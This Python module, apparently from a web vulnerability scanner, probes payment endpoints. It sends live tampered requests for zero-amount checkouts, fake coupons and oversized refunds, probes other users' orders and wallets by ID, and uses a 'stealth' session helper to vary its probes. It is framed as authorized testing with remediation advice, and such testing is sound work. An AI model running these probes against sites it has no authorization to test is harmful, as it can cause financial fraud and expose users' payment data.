"""
Payment & Financial Impact — finds flaws that directly lead to users losing money:
zero/negative payment acceptance, payment method and wallet IDOR, refund abuse,
checkout bypass, and subscription/plan tampering.

This is the module that answers: "Can an attacker pay nothing? Steal another
user's payment data? Refund more than they paid? Downgrade their plan but keep
premium?" Authorized use only.
"""

from __future__ import annotations

import json
import re
import sys
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

import requests

sys.path.insert(0, str(Path(__file__).parent))
from stealth import get_session, randomize_order, set_scan_seed

SESSION = get_session()
TIMEOUT = 8
RUN_BUDGET_SEC = 25

# Paths that mean "money moves here" — we probe these first (includes crypto/trading)
FINANCIAL_PATH_KEYWORDS = [
    "checkout", "payment", "pay", "purchase", "order", "place-order", "cart", "complete",
    "wallet", "balance", "transfer", "withdraw", "withdrawal", "deposit", "payout",
    "refund", "cancel", "void", "reversal", "chargeback",
    "subscription", "subscribe", "plan", "billing", "invoice", "invoicing",
    "coupon", "voucher", "gift-card", "giftcard", "credit", "redeem", "apply",
    "stripe", "paypal", "braintree", "payment-method", "payment_method", "cards",
    "trade", "swap", "position", "positions", "pnl", "portfolio", "orderbook",
    "fill", "fills", "solana", "crypto", "exchange", "defi",
    "history", "activity", "export", "webhook", "notification", "market", "quote",
    "slippage", "referral", "affiliate", "oracle",
]
# Params that control money or market behaviour — tamper these
MONEY_PARAMS = [
    ("amount", "0"),
    ("amount", "0.01"),
    ("total", "0"),
    ("total", "0.01"),
    ("price", "0"),
    ("sum", "0"),
    ("quantity", "0"),
    ("quantity", "-1"),
    ("discount", "100"),
    ("discount_percent", "100"),
    ("coupon", "FREE100"),
    ("promo", "100OFF"),
    ("plan_id", "free"),
    ("tier", "0"),
    ("payment_method", "free"),
    ("paid", "0"),
    ("currency", "XXX"),  # sometimes weak currency
    ("slippage", "0"),
    ("slippage_bps", "0"),
    ("max_slippage", "100"),
    ("referral_id", "1"),
    ("affiliate_id", "1"),
]
# Response signals that mean "money action accepted"
SUCCESS_MONEY = re.compile(
    r"\b(success|completed|confirmed|paid|credited|refunded|placed|thank you|order #|order id|confirmation)\b",
    re.I,
)
# Signals of payment/balance data (if we see this for another user's id = IDOR)
PAYMENT_DATA = re.compile(
    r"\b(last4|card_number|balance|wallet|amount|transaction|payment_method)\b",
    re.I,
)


@dataclass
class Finding:
    title: str
    severity: str
    url: str
    category: str
    evidence: str
    impact: str
    remediation: str


@dataclass
class PaymentFinancialReport:
    target_url: str
    findings: list[Finding] = field(default_factory=list)
    endpoints_probed: int = 0
    errors: list[str] = field(default_factory=list)


def _over_budget(start: float) -> bool:
    return (time.time() - start) > RUN_BUDGET_SEC


def _make_auth_session(cookies_str: str | None, bearer_token: str | None):
    """Build a session with optional cookies and Bearer token (for authenticated scans)."""
    s = requests.Session()
    if SESSION.headers:
        s.headers.update(dict(SESSION.headers))
    s.timeout = TIMEOUT
    if cookies_str:
        for part in cookies_str.split(";"):
            part = part.strip()
            if "=" in part:
                name, val = part.split("=", 1)
                s.cookies.set(name.strip(), val.strip(), domain="")
    if bearer_token:
        s.headers["Authorization"] = f"Bearer {bearer_token.strip()}"
    return s


def _path_is_financial(path: str) -> bool:
    p = path.lower()
    return any(kw in p for kw in FINANCIAL_PATH_KEYWORDS)


def _discover_financial_urls(base_url: str, run_start: float, session: requests.Session | None = None) -> list[str]:
    """Build list of URLs that look like payment/financial endpoints."""
    sess = session or SESSION
    parsed = urlparse(base_url)
    base = f"{parsed.scheme or 'https'}://{parsed.netloc}"
    seen: set[str] = set()
    urls: list[str] = []

    # High-value paths to probe (including crypto/trading terminals)
    paths = [
        "/checkout", "/checkout/complete", "/payment", "/pay", "/purchase", "/order", "/place-order",
        "/api/checkout", "/api/payment", "/api/orders", "/api/order", "/api/payments",
        "/api/wallet", "/api/balance", "/api/transfer", "/api/withdraw", "/api/refund",
        "/api/subscription", "/api/billing", "/api/invoice", "/api/cards", "/api/payment-methods",
        "/cart/checkout", "/shop/checkout", "/store/checkout",
        "/billing", "/account/billing", "/settings/billing",
        "/refund", "/api/refund", "/cancel", "/api/cancel",
        "/api/trades", "/api/positions", "/api/portfolio", "/api/orderbook", "/api/fills",
        "/api/wallet/balance", "/api/me", "/trade", "/swap", "/api/swap", "/api/solana", "/api/rpc",
        "/api/history", "/api/activity", "/api/export", "/api/trades/history", "/api/orders/history",
        "/api/webhooks", "/api/notifications", "/api/market", "/api/quote", "/api/referral", "/api/affiliate",
        "/api/v1/me", "/api/v2/me", "/api/v1/wallet", "/api/v2/wallet", "/v1/api/orders", "/v2/api/orders",
        "/api/account/delete", "/api/revoke", "/api/auth/revoke", "/api/logout",
        "/api/invite", "/api/invites", "/api/team", "/api/members", "/api/org", "/api/organization",
        "/api/consent", "/api/data-export", "/api/gdpr-export", "/api/me/export",
    ]
    for path in randomize_order(paths)[:24]:
        if _over_budget(run_start):
            break
        u = base.rstrip("/") + path
        if u not in seen:
            seen.add(u)
            urls.append(u)

    # From page: links that look financial
    try:
        r = sess.get(base_url, timeout=TIMEOUT, allow_redirects=True)
        if _over_budget(run_start):
            return urls
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(r.text, "html.parser")
        for a in soup.find_all("a", href=True):
            href = a["href"].strip()
            if not href or href.startswith("#"):
                continue
            full = urljoin(base_url, href)
            if urlparse(full).netloc != parsed.netloc:
                continue
            if full in seen:
                continue
            if _path_is_financial(urlparse(full).path):
                seen.add(full)
                urls.append(full)
        for form in soup.find_all("form", action=True):
            action = form.get("action", "").strip()
            if not action:
                continue
            full = urljoin(base_url, action)
            if urlparse(full).netloc != parsed.netloc or full in seen:
                continue
            if _path_is_financial(urlparse(full).path):
                seen.add(full)
                urls.append(full)
    except Exception:
        pass
    return urls[:18]


def _probe_amount_tampering(url: str, run_start: float, session: requests.Session | None = None) -> Finding | None:
    """Send requests with amount/total/price/discount tampering; report if server accepts success-like response."""
    sess = session or SESSION
    parsed = urlparse(url)
    path_lower = parsed.path.lower()
    if not _path_is_financial(path_lower):
        return None

    for param, value in randomize_order(MONEY_PARAMS)[:10]:
        if _over_budget(run_start):
            break
        # GET
        try:
            params = parse_qs(parsed.query)
            params[param] = [value]
            test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
            r = sess.get(test_url, timeout=TIMEOUT, allow_redirects=False)
            if r.status_code not in (200, 201, 302):
                continue
            body = (r.text or "").lower()
            if SUCCESS_MONEY.search(body) and value in ("0", "0.01", "-1", "free", "FREE100"):
                return Finding(
                    title="Server accepted zero or manipulated payment parameter [LIKELY]",
                    severity="High",
                    url=test_url,
                    category="Payment / Financial Impact",
                    evidence=f"[Needs manual verification] Request with {param}={value} returned {r.status_code} and success-like response.",
                    impact="Attackers may be able to complete checkout for free or manipulate plan/price. Verify that the transaction actually completed.",
                    remediation="Never trust client-supplied amount, total, price, discount, or plan_id. Validate and enforce all monetary values server-side.",
                )
        except requests.RequestException:
            continue

        # POST JSON body — only flag for abnormal monetary values
        if value not in ("0", "0.01", "-1", "free", "FREE100"):
            continue
        try:
            body_json = {param: value if value not in ("0", "0.01") else (0 if value == "0" else 0.01)}
            r = sess.post(url, json=body_json, timeout=TIMEOUT, allow_redirects=False)
            if r.status_code not in (200, 201, 302):
                continue
            body = (r.text or "").lower()
            if SUCCESS_MONEY.search(body):
                return Finding(
                    title="Server accepted tampered payment in POST body [LIKELY]",
                    severity="High",
                    url=url,
                    category="Payment / Financial Impact",
                    evidence=f"[Needs manual verification] POST with {param}={value} returned {r.status_code} and success-like response.",
                    impact="Client-controlled payment data may be accepted, enabling free checkout.",
                    remediation="Validate all payment-related fields server-side. Do not trust any amount, total, or discount from the client.",
                )
        except requests.RequestException:
            continue
    return None


def _probe_payment_idor(url: str, run_start: float, session: requests.Session | None = None) -> Finding | None:
    """Probe payment/wallet/order endpoints with different IDs; if we get 200 with payment-like data, possible IDOR."""
    sess = session or SESSION
    parsed = urlparse(url)
    path_lower = parsed.path.lower()
    # Only for endpoints that suggest per-user payment/trading data
    if not any(kw in path_lower for kw in ["order", "wallet", "balance", "payment", "card", "invoice", "transaction", "history", "activity", "export", "trade", "position"]):
        return None
    params = parse_qs(parsed.query)
    id_params = [p for p in params if p.lower() in ("id", "order_id", "user_id", "account_id", "invoice_id", "wallet_id", "position_id", "trade_id")]
    if not id_params:
        # Try path segment: /order/123
        segs = re.findall(r"/(\d{2,})", parsed.path)
        if not segs:
            return None
        # Try adjacent id
        for seg in segs[:2]:
            if _over_budget(run_start):
                break
            try:
                alt = str(int(seg) + 1)
                new_path = re.sub(r"/" + re.escape(seg) + r"(?=/|$)", f"/{alt}", parsed.path, count=1)
                test_url = urlunparse(parsed._replace(path=new_path))
                r = sess.get(test_url, timeout=TIMEOUT, allow_redirects=False)
                if r.status_code == 200 and len(r.text) > 50 and PAYMENT_DATA.search(r.text):
                    return Finding(
                        title="Critical: Possible access to another user's payment or order data (IDOR) [VERIFY]",
                        severity="Critical",
                        url=test_url,
                        category="Payment / Financial Impact",
                        evidence=f"Altered path ID {seg} -> {alt} returned 200 with payment/order-like content. Confirm if data belongs to another user.",
                        impact="Attackers can view or modify other users' orders, payment methods, or balances — leading to fraud and data breach.",
                        remediation="Enforce authorization: ensure the authenticated user owns the requested order/wallet/payment resource.",
                    )
            except (requests.RequestException, ValueError):
                continue
        return None
    for p in id_params[:2]:
        if _over_budget(run_start):
            break
        val = (params[p] or [""])[0]
        if not val or not (val.isdigit() or len(val) > 6):
            continue
        try:
            alt = str(int(val) + 1) if val.isdigit() else val
            new_params = {k: (v if k != p else [alt]) for k, v in params.items()}
            test_url = urlunparse(parsed._replace(query=urlencode(new_params, doseq=True)))
            r = sess.get(test_url, timeout=TIMEOUT, allow_redirects=False)
            if r.status_code == 200 and PAYMENT_DATA.search(r.text or ""):
                return Finding(
                    title="Critical: Possible payment/order IDOR via parameter [VERIFY]",
                    severity="Critical",
                    url=test_url,
                    category="Payment / Financial Impact",
                    evidence=f"Altered {p}={val} -> {alt} returned 200 with payment-like data. Confirm if this is another user's data.",
                    impact="Attackers can access or tamper with other users' payment data, orders, or balances.",
                    remediation="Authorize every request: verify the resource belongs to the current user.",
                )
        except (requests.RequestException, ValueError):
            continue
    return None


def _probe_refund_abuse(url: str, run_start: float, session: requests.Session | None = None) -> Finding | None:
    """Probe refund/cancel endpoints: refund more than paid, or double refund."""
    sess = session or SESSION
    path_lower = urlparse(url).path.lower()
    if "refund" not in path_lower and "cancel" not in path_lower and "void" not in path_lower:
        return None
    try:
        # POST refund with amount higher than possible
        payloads = [
            {"amount": 999999, "reason": "test"},
            {"refund_amount": 999999},
            {"order_id": "1", "amount": 999999},
        ]
        for payload in payloads[:2]:
            if _over_budget(run_start):
                break
            r = sess.post(url, json=payload, timeout=TIMEOUT, allow_redirects=False)
            if r.status_code in (200, 201) and SUCCESS_MONEY.search(r.text or ""):
                return Finding(
                    title="Critical: Refund endpoint accepted large or client-controlled amount [VERIFY]",
                    severity="Critical",
                    url=url,
                    category="Payment / Financial Impact",
                    evidence=f"POST with amount=999999 (or similar) returned success-like response. Server may not validate refund amount against original order.",
                    impact="Attackers could request refunds larger than the original payment, causing direct financial loss.",
                    remediation="Validate refund amount against the original transaction. Never trust client-supplied refund amount.",
                )
    except requests.RequestException:
        pass
    return None


# Form field names that control money — tamper these in checkout/cart forms
FORM_MONEY_FIELDS = ["amount", "total", "price", "sum", "quantity", "qty", "discount", "discount_percent", "coupon", "plan_id", "tier", "payment_method", "paid"]


def _probe_form_checkout(base_url: str, run_start: float, session: requests.Session | None = None) -> Finding | None:
    """Find checkout/cart forms, submit with amount/price/quantity tampered to 0 or 0.01; report if success-like."""
    sess = session or SESSION
    try:
        r = sess.get(base_url, timeout=TIMEOUT, allow_redirects=True)
        if _over_budget(run_start) or r.status_code != 200:
            return None
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(r.text, "html.parser")
        for form in soup.find_all("form"):
            action = form.get("action") or base_url
            action_url = urljoin(base_url, action)
            if urlparse(action_url).netloc != urlparse(base_url).netloc:
                continue
            method = (form.get("method") or "get").strip().upper()
            inputs = form.find_all(["input", "textarea"], {"name": True})
            data: dict[str, str] = {}
            for inp in inputs:
                name = inp.get("name")
                if not name:
                    continue
                data[name] = inp.get("value") or ""
            if not data:
                continue
            # Only probe forms that have money-related fields
            money_fields = [f for f in FORM_MONEY_FIELDS if any(f in k.lower() for k in data)]
            if not money_fields:
                continue
            for field in money_fields[:3]:
                key = next((k for k in data if field in k.lower()), None)
                if not key or _over_budget(run_start):
                    break
                tampered = dict(data)
                tampered[key] = "0" if "amount" in key.lower() or "total" in key.lower() or "price" in key.lower() or "quantity" in key.lower() else "0.01"
                try:
                    if method == "POST":
                        resp = sess.post(action_url, data=tampered, timeout=TIMEOUT, allow_redirects=True)
                    else:
                        resp = sess.get(action_url, params=tampered, timeout=TIMEOUT, allow_redirects=True)
                    if resp.status_code in (200, 201, 302) and SUCCESS_MONEY.search(resp.text or ""):
                        return Finding(
                            title="Critical: Checkout/cart form accepted tampered amount or quantity [CONFIRMED]",
                            severity="Critical",
                            url=action_url,
                            category="Payment / Financial Impact",
                            evidence=f"Form submitted with {key}={tampered[key]} returned success-like response. Client-supplied payment data was accepted.",
                            impact="Attackers can complete purchase for free or with manipulated quantity/discount via form tampering.",
                            remediation="Validate all amount, price, quantity, and discount server-side; never trust form fields.",
                        )
                except requests.RequestException:
                    continue
    except Exception:
        pass
    return None


def run(
    target_url: str,
    scan_type: str = "full",
    cookies: str | None = None,
    bearer_token: str | None = None,
) -> str:
    set_scan_seed(target_url)
    report = PaymentFinancialReport(target_url=target_url)
    run_start = time.time()
    url = target_url if target_url.startswith("http") else f"https://{target_url}"
    session = _make_auth_session(cookies, bearer_token) if (cookies or bearer_token) else None

    if scan_type not in ("full", "payment", "financial"):
        return json.dumps(asdict(report), indent=2)

    # Form-based checkout/cart tampering first (high impact)
    finding = _probe_form_checkout(url, run_start, session)
    if finding:
        report.findings.append(finding)
    if _over_budget(run_start):
        return json.dumps(asdict(report), indent=2)

    candidates = _discover_financial_urls(url, run_start, session)
    for candidate in candidates:
        if _over_budget(run_start) or len(report.findings) >= 4:
            break
        report.endpoints_probed += 1
        finding = _probe_amount_tampering(candidate, run_start, session)
        if finding:
            report.findings.append(finding)
            continue
        finding = _probe_payment_idor(candidate, run_start, session)
        if finding:
            report.findings.append(finding)
            continue
        finding = _probe_refund_abuse(candidate, run_start, session)
        if finding:
            report.findings.append(finding)

    return json.dumps(asdict(report), indent=2)


if __name__ == "__main__":
    t = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    st = sys.argv[2] if len(sys.argv) > 2 else "full"
    print(run(t, st))
